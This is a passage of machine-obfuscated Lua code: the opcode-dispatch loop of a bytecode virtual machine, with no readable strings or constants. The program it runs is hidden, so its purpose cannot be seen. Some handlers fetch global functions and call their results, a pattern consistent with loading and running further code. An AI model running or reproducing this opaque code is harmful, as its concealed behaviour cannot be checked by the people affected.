                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                  elseif (Enum == 63) then
                    local A;
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                  else
                    local A;
                    local K;
                    local B;
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    B = Inst[3];
                    K = Stk[B];
                    for Idx = B + 1, Inst[4] do
                      K = K .. Stk[Idx];
                    end
                    Stk[Inst[2]] = K;
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                  end
                elseif (Enum <= 65) then
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                elseif (Enum == 66) then
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Env[Inst[3]] = Stk[Inst[2]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Env[Inst[3]] = Stk[Inst[2]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                else
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                end
              elseif (Enum <= 70) then
                if (Enum <= 68) then
                  local K;
                  local B;
                  local A;
                  Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = {};
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  B = Inst[3];
                  K = Stk[B];
                  for Idx = B + 1, Inst[4] do
                    K = K .. Stk[Idx];
                  end
                  Stk[Inst[2]] = K;
                elseif (Enum > 69) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3] ~= 0;
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                else
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3] ~= 0;
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                end
              elseif (Enum <= 72) then
                if (Enum > 71) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3] ~= 0;
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                else
                  local Results;
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Stk[A + 1]));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results = {Stk[A](Unpack(Stk, A + 1, Top))};
                  Edx = 0;
                  for Idx = A, Inst[4] do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  VIP = Inst[3];
                end
              elseif (Enum == 73) then
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
              else
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3] ~= 0;
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
            elseif (Enum <= 86) then
              if (Enum <= 80) then
                if (Enum <= 77) then
                  if (Enum <= 75) then
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  elseif (Enum > 76) then
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3] ~= 0;
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  else
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  end
                elseif (Enum <= 78) then
                  local Results;
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Stk[A + 1]));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results = {Stk[A](Unpack(Stk, A + 1, Top))};
                  Edx = 0;
                  for Idx = A, Inst[4] do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  VIP = Inst[3];
                elseif (Enum > 79) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
